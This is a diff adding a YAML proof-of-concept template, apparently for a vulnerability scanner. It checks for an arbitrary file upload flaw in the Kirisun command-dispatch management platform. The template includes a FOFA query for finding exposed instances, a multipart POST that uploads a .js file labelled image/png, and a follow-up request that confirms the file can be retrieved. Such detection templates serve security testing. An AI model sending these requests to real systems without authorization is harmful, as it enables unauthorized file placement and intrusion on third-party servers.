@@ -1,0 +1,26 @@
+id: poc-yaml-kirisun-platform-uploadfile-upload
+info:
+  name: 指挥调度管理平台 event—uploadfile任意文件上传
+  severity: high
+  tags:
+  - 文件上传
+  finger: 科立讯指挥调度管理平台
+  fofa: body="指挥调度管理平台"
+requests:
+- method: POST
+  path: /api/client/event/uploadfile.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
+  data: "\n------WebKitFormBoundary25qW4eG1Jt50iyf7\nContent-Disposition: form-data;\
+    \ name=\"uuid\"\n\n  1\n------WebKitFormBoundary25qW4eG1Jt50iyf7\nContent-Disposition:\
+    \ form-data; name=\"number\"\n\n  1\n------WebKitFormBoundary25qW4eG1Jt50iyf7\n\
+    Content-Disposition: form-data; name=\"uploadfile\";filename=\"1.js\"\nContent-Type:\
+    \ image/png\n\nvulnerability\n------WebKitFormBoundary25qW4eG1Jt50iyf7--"
+  output:
+  - regex_match(body,`event\\\/(?P<filepath>.*?).js`)
+  expression: "status_code == 200 && \ncontains(body,\"successed\")\n"
+- method: POST
+  path: /upload/event/{{.filepath}}.js
+  expression: "status_code == 200 && \ncontains(body,\"vulnerability\")\n"
+variables: {}
+transport: http
